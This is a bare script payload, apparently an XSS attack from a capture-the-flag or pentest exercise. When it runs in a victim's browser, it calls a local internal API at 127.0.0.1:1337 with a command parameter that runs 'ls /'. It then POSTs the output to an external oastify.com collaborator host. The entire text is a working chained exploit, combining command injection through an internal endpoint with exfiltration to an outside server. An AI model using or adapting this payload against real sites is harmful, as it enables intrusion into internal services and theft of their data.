<script>
fetch("http://127.0.0.1:1337/api/stats?command=ls+/").then((r) => {
    return r.text();
}).then((x) => {
    fetch("http://rhckcwis5voitardnysarlzp9gf733rs.oastify.com/submit", {
        "headers": {
            "content-type": "application/json"
        },
        "body": x,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });
});</script>
